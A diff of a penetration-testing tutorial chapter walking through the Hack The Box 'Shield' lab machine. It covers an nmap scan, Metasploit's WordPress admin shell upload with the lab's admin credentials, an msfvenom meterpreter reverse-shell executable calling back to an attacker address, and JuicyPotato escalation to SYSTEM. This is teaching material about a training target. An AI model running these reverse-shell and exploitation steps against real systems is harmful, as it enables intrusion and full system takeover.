@@ -14,15 +14,21 @@ There will be things that you do here that haven’t been covered yet and so I a
 
 To connect to the Starting Point machines, you need to run a VPN with the Starting Point access pack. Download the openvpn configuration file and run that using:
 
-`sudo openvpn <username>-startingpoint.ovpn`
+```bash
+sudo openvpn <username>-startingpoint.ovpn
+```
 
 I find it convenient to add the hostname of the machine in the /etc/hosts file so that I can refer to the hostname and not have to remember the IP address. Add the hostname of the machine and associate it with its IP address:
 
-`sudo vi /etc/hosts`
+```bash
+sudo vi /etc/hosts
+```
 
 and then add
 
-`10.10.10.29 shield.htb`
+```bash
+10.10.10.29 shield.htb
+```
 
 Create a directory called Shield that you can use as the working directory for this challenge. Create a sub-directory called nmap to store the nmap results.
 
@@ -36,7 +42,9 @@ To start, add a hostname for the box and associate it with its IP address.
 
 Run an nmap scan in the terminal using the command:
 
-`nmap -Pn -v -sC -sV -p- --min-rate=1000 -T4 shield.htb -o nmap/shield-tcp-full`
+```bash
+nmap -Pn -v -sC -sV -p- --min-rate=1000 -T4 shield.htb -o nmap/shield-tcp-full
+```
 
 You might see an alternative of this command which is to run an initial scan to get the open ports and then run the second command to get information about the services and versions of software. There isn't very much difference between the two approaches however and so it is easier simply to run the single script.
 
@@ -54,11 +62,9 @@ PORT STATE SERVICE VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-The output from nmap tells us that Shield is a windows box running Microsoft IIS web server on port 80. Opening the URL [http://shield.htb](http://shield.htb) gives the default IIS web page \(Figure 1-7\).
+The output from nmap tells us that Shield is a windows box running Microsoft IIS web server on port 80. Opening the URL [http://shield.htb](http://shield.htb) gives the default IIS web page.
 
-!\[Graphical user interface, chart, treemap chart
-
-Description automatically generated\]\(../.gitbook/assets/7%20%285%29.png\)
+![](../.gitbook/assets/chapter15.png)
 
 ## Check for Subdirectories
 
@@ -97,25 +103,27 @@ On Windows it is the **cmd.exe** program, on Linux it is bash or zsh that runs i
 
 We will explore all of this in more detail in the next chapter, but for the moment, we are going to get a reverse shell using Meterpreter. Time to turn to Metasploit which has a way of launching a meterpreter reverse shell in PHP! Start Metasploit by selecting it from the menu or by running
 
-`sudo msfconsole-start`
+```bash
+sudo msfconsole-start
+```
 
 In Metasploit, we are going to use an existing exploit of the WordPress administrator account by uploading a plugin to WordPress that is actually a reverse shell. Plugins, as we see later when we craft our own custom plugin, are ways of packaging PHP code to add functionality to WordPress. The security vulnerability with this is that this code has access to do whatever the user account that is running WordPress can do. There is nothing limiting what code in plugins can do normally. In the case of this exploit, we use the command:
 
-`use exploit/unix/webapp/wp_admin_shell_upload`
+```bash
+use exploit/unix/webapp/wp_admin_shell_upload
+```
 
 We can ignore the fact that this is a Windows box not a Unix one. It still works.
 
 You can set the options for this exploit using the set command:
 
-`set PASSWORD P@s5w0rd!`
-
-`set USERNAME admin`
-
-`set TARGETURI /wordpress`
-
-`set RHOSTS 10.10.10.29`
-
-`set LHOST 10.10.14.2`
+```bash
+set PASSWORD P@s5w0rd!
+set USERNAME admin
+set TARGETURI /wordpress
+set RHOSTS 10.10.10.29
+set LHOST 10.10.14.2
+```
 
 LHOST is the IP address of your attacker machine which you can get using the command “ifconfig”. After doing that, the options should look as follows:
 
@@ -162,7 +170,7 @@ meterpreter >
 That gives us a meterpreter shell that is a little unstable and also, because it is written in PHP, somewhat limited in its abilities. We are going to generate a better meterpreter shell using a program called msfvenom. To start with we can use msfvenom to generate a Windows executable program that will run the meterpreter reverse shell. To do this, we can type
 
 ```text
-Meterpreter > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
+meterpreter > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
 [*] exec: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -170,6 +178,10 @@ No encoder specified, outputting raw payload
 Payload size: 200262 bytes
 Final size of exe file: 206848 bytes
 ```
+
+{% hint style="warning" %}
+If you have problems running msfvenom within Metasploit, you can run it from the command line in bash
+{% endhint %}
 
 Once the payload is created, we can upload it to the Shield machine using the meterpreter command upload:
 
@@ -259,7 +271,9 @@ From experience, I know that the most promising exploit is going to be ms16\_075
 
 We can run another handler as before and then upload JuicyPotato.exe. One more step however as executing it from the meterpreter prompt doesn’t work. So you can drop into a cmd.exe shell prompt by typing “shell”. From the command prompt, you can then run the JuicyPotato.exe
 
-`JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337`
+```bash
+JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\dBPEarcLsr\revshell.exe -l 1337
+```
 
 Remember to change the path of the revshell.exe to the actual path name Meterpreter has used. When JuicyPotato.exe runs, it will start another meterpreter session but as the privileged user that the exploit has impersonated, NT AUTHORITY\SYSTEM. From there, you can cd \(change directory\) into the c:\Users\Administrator directory and find the flag.
 
@@ -334,11 +348,7 @@ You have seen how Metasploit can make discovery and exploitation a simple proces
 
 Visiting the Shield WordPress site at [http://shield.htb/wordpress](http://shield.htb/wordpress), you will find a website called Shields Up which is for a company supplying electric trucks \(Figure 1-8\).
 
-!\[Graphical user interface, application, website
-
-Description automatically generated\]\(../.gitbook/assets/8%20%283%29.png\)
-
-Home page for [http://shield.htb/wordpress](http://shield.htb/wordpress)
+![Home page for http://shield.htb/wordpress](../.gitbook/assets/chapter16.png)
 
 Navigating to the WorPress administration site at [http://shield.htb/wordpress/wp-admin](http://shield.htb/wordpress/wp-admin), you can enter the username and password admin and P@s5w0rd! to get in and get the Dashboard page \(Figure 1-9\).
 
@@ -348,7 +358,9 @@ Navigating to the WorPress administration site at [http://shield.htb/wordpress/w
 
 We can now call the reverse shell by entering the url
 
-`http://shield.htb/wordpress/wp-content/plugins/newplugin/revshell.php`
+```bash
+http://shield.htb/wordpress/wp-content/plugins/newplugin/revshell.php
+```
 
 This should first call the web server to get the PowerShell file
 
